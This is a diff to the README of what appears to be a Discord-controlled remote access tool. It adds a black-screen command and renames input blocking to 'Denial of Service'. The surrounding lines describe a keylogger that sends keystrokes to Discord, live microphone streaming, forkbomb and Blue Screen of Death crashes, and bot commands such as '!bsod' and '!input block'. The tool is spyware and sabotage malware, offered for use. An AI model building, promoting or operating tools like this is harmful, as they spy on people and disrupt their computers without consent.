@@ -32,7 +32,7 @@ It can handle multiple Devices at once.
 - **Live Stream Mic:** Livestream the Computers Microphone to a discord voice channel.
 - **Keylogger:** Log keystrokes and sends them to a Discord channel
 - **TTS:** Play Text To Speech Messages on the Computer
-- **Block Input:** Completely block the users input, Keyboard and Mouse.
+- **Denial of Service:** Completely block the users input, Keyboard and Mouse. Or make the screen completely black and let the pointer disappear.
 - **Crash/bsod:** Crash the Computer, with a Forkbomb or a Blue Screen of Death.
 - **Rickroll:** Play a full screen rickroll, you can only escape it with the Power Button or `Ctrl + Alt + Delete`.
 - **Volume Control:** Change the Computers Volume or mute/unmute it.
@@ -105,9 +105,10 @@ python your_script_name.py
 | `!input <block/unblock>`     | Completely blocks or unblocks the User Input, Keyboard and Mouse.                                   |                                                       |
 | `!rickroll`                  | Plays an inescapeable Rickroll.                                                                     |
 | `!bsod`                      | Triggers a Blue Screen of Death.                                                                    |
-| `!volume`                    | Shows volume information and available commands.                                                  |
-| `!volume <mute/unmute>`      | Mutes or unmutes the Device.                                                                      |
-| `!volume <number from 1-100>`| Sets the Volume to a specific Percentage.                                                         |
+| `!volume`                    | Shows volume information and available commands.                                                    |
+| `!volume <mute/unmute>`      | Mutes or unmutes the Device.                                                                        |
+| `!volume <number from 1-100>`| Sets the Volume to a specific Percentage.                                                           |
+| `!blackscreen <on/off>`      | Makes the Screen completely black and lets the Pointer Disappear.                                   |
 
 ### Example Usage
 
